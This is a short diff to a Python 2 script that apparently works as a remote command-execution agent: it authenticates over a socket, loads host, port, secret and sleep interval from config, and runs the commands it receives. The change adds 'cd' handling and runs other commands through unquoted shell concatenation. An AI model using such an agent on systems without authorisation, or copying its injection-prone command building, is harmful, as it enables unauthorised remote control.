@@ -7,6 +7,7 @@ import commands  # Python 2 replacement for subprocess.getoutput
 # import sys
 import os
 
+current_dir = os.getcwd()
 CONFIG_FILE = os.path.abspath("config.json")
 
 
@@ -49,13 +50,37 @@ def authenticate(sock, secret):
         return False
 
 
+# def execute_command(command):
+#     try:
+#         result = commands.getoutput(command)
+#         return result
+#     except Exception as e:
+#         return "ERROR: " + str(e)
+
 def execute_command(command):
+    global current_dir
     try:
-        result = commands.getoutput(command)
+        command = command.strip()
+
+        if command.startswith("cd"):
+            parts = command.split(" ", 1)
+            if len(parts) > 1:
+                new_dir = parts[1]
+                try:
+                    os.chdir(new_dir)
+                    current_dir = os.getcwd()
+                    return ""
+                except Exception as e:
+                    return "cd error: " + str(e)
+            else:
+                return current_dir
+
+        # run other commands in current directory
+        result = commands.getoutput("cd " + current_dir + " && " + command)
         return result
+
     except Exception as e:
         return "ERROR: " + str(e)
-
 
 def main():
     host, port, secret, sleep_time = load_config()
